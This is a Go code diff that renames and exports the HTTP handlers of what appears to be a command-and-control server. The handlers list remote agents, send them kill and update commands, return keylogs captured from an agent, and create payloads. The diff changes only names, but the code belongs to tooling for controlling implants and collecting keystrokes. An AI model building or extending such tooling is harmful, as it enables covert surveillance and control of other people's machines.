@@ -1,4 +1,4 @@
-package main
+package server
 
 import (
 	"os/exec"
@@ -11,7 +11,7 @@ import (
 	"github.com/google/uuid"
 )
 
-func getAgentsHandler(c *gin.Context) {
+func GetAgentsHandler(c *gin.Context) {
     // Get all agents
     agents, err := Agents()
     if err != nil {
@@ -23,7 +23,7 @@ func getAgentsHandler(c *gin.Context) {
     return
 }
 
-func getGroupAgents(c *gin.Context) {
+func GetGroupAgents(c *gin.Context) {
     // Get agent groups
     agentGroups, err := GroupAgentsByIp()
     if err != nil {
@@ -35,7 +35,7 @@ func getGroupAgents(c *gin.Context) {
     return
 }
 
-func getGroupAgentsByIP(c *gin.Context) {
+func GetGroupAgentsByIP(c *gin.Context) {
     // Get agents by IP
 	ip := c.Param("ip")
     agents, err := AgentsByIp(ip)
@@ -48,7 +48,7 @@ func getGroupAgentsByIP(c *gin.Context) {
     return
 }
 
-func getOneAgentByUUID(c *gin.Context) {
+func GetOneAgentByUUID(c *gin.Context) {
     // Get agents by UUID
 	uuid := c.Param("agt")
 	fmt.Println("Trying to find agent", uuid)
@@ -62,7 +62,7 @@ func getOneAgentByUUID(c *gin.Context) {
     return
 }
 
-func getAgentByUUID(c *gin.Context) {
+func GetAgentByUUID(c *gin.Context) {
     // Get agents by UUID
 	uuid := c.Param("agt")
 	fmt.Println("Trying to find agent", uuid)
@@ -76,7 +76,7 @@ func getAgentByUUID(c *gin.Context) {
     return
 }
 
-func updateAgentHandler(c *gin.Context) {
+func UpdateAgentHandler(c *gin.Context) {
 	agentParam := c.Param("agt")
 	newCmdID := uuid.New().String()
 
@@ -106,7 +106,7 @@ func updateAgentHandler(c *gin.Context) {
 	}
 }
 
-func killAgentHandler(c *gin.Context) {
+func KillAgentHandler(c *gin.Context) {
 	agentParam := c.Param("agt")
 	newCmdID := uuid.New().String()
 	SendAgentCommand(agentParam, "0", "kill", "Kill Agent", newCmdID)
@@ -114,18 +114,18 @@ func killAgentHandler(c *gin.Context) {
 	c.JSON(http.StatusOK, gin.H{"message": "Success"})
 }
 
-func getKeylogHandler(c *gin.Context) {
+func GetKeylogHandler(c *gin.Context) {
 	agentParam := c.Param("agt")
 	keylogs := Keylog(agentParam)
 	c.JSON(http.StatusOK, gin.H{"data": keylogs})
 }
 
-func getPayloadsHandler(c *gin.Context) {
+func GetPayloadsHandler(c *gin.Context) {
 	payloads := Payloads()
 	c.JSON(http.StatusOK, gin.H{"data": payloads})
 }
 
-func createPayloadHandler(c *gin.Context) {
+func CreatePayloadHandler(c *gin.Context) {
 	publickey := goDotEnvVariable("PUBLIC_KEY")
 	newPayID := uuid.New().String()
 	var body map[string]string
